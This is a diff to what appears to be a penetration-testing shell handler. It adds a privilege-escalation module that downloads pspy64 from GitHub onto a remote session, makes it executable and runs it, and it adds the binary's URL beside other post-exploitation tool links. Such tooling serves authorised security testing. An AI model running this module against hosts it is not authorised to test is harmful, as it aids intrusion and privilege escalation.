@@ -4425,6 +4425,29 @@ class linuxexploitsuggester(Module):
 			logger.error("This module runs only on Unix shells")
 
 
+class pspy(Module):
+	category = "Privilege Escalation"
+	def run(session, args):
+		"""
+		Monitor Linux processes without root permissions using pspy64
+		"""
+		if session.OS == 'Unix':
+			if not session.system == 'Linux':
+				logger.error(f"This module runs only on Linux, not on {session.system}.")
+				return False
+			uploaded_path = session.upload(URLS['pspy64'], remote_path=session.tmp)
+			if uploaded_path:
+				session.exec(f"chmod +x {uploaded_path[0]}")
+				logger.info(f"pspy64 uploaded to {uploaded_path[0]}")
+				tf = f"/tmp/{rand(8)}"
+				with open(tf, "w") as f:
+					f.write("#!/bin/sh\n")
+					f.write(f"{uploaded_path[0]}")
+				session.script(tf)
+		else:
+			logger.error("This module runs only on Unix shells")
+
+
 class meterpreter(Module):
 	def run(session, args):
 		"""
@@ -5191,6 +5214,7 @@ URLS = {
 	'deepce':       "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh",
 	'privesccheck': "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1",
 	'les':          "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh",
+	'pspy64':       "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64",
 	'ngrok_linux':  "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
 	'uac_linux':  	"https://github.com/tclahr/uac/releases/download/v3.1.0/uac-3.1.0.tar.gz",
 	'linux_procmemdump':  	"https://raw.githubusercontent.com/tclahr/uac/refs/heads/main/bin/linux/linux_procmemdump.sh",
